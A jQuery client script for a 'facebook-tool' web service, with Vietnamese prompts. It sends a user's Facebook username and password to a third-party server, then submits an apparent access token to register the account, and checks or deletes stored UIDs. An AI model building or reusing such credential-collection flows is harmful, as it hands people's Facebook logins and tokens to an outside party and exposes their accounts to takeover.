var loading = $('#loading');

var step = 1;

var check_token = function (uid) {
    var parent = $('.' + uid);

    parent.find('.check').toggleClass('hidden');
    parent.find('.active').addClass('hidden');
    parent.find('.not-active').addClass('hidden');

    $.ajax({
        type: 'POST',
        url: server + '/facebook-tool/check-uid-from-client',
        data: {
            uid: uid,
            username: $('#username-send').val()
        },
        error: function () {
        },
        success: function (response) {

            parent.find('.check').toggleClass('hidden');

            if (response) {
                parent.find('.active').removeClass('hidden');
            }
            else {
                parent.find('.not-active').removeClass('hidden');
            }
        }
    });
};

var delete_token = function (uid) {

    var c = confirm("Bạn có chắc chắn muốn xóa tài khoản facebook này");

    if (c) {
        $.ajax({
            type: 'POST',
            url: server + '/facebook-tool/delete-uid-from-client',
            data: {
                uid: uid,
                username: $('#username-send').val()
            },
            error: function () {
            },
            success: function (response) {

                if (response) {
                    location.reload();
                }
            }
        });
    }
};

var verify_account = function () {

    loading.css('display', 'block');

    if (step === 2) {
        $.ajax({
            type: 'POST',
            url: server + '/facebook-tool/add-account-from-client',
            data: {
                result: $('#result').val(),
                username: $('#username-send').val()
            },
            error: function () {
            },
            success: function (response) {

                if (response) {
                    $('.result-success').css('display', 'block');
                    $('.result-error').css('display', 'none');
                    loading.css('display', 'none');

                    location.reload();
                }
                else {
                    $('.result-error').css('display', 'block');
                    $('.result-success').css('display', 'none');
                    loading.css('display', 'none');
                }
            }
        });
    }
    else {
        $.ajax({
            type: 'POST',
            url: server + '/facebook-tool/verify-account',
            data: {
                username: $('#username').val(),
                password: $('#password').val()
            },
            error: function () {
            },
            success: function (response) {

                var result_verify = $('#result-verify');

                result_verify.find('iframe').attr('src', response);

                loading.css('display', 'none');

                result_verify.css('display', 'block');
            }
        });
    }
};

var go_step_two = function () {
    $('#step-1').css('display', 'none');
    $('#step-2').css('display', 'block');

    step = 2;
};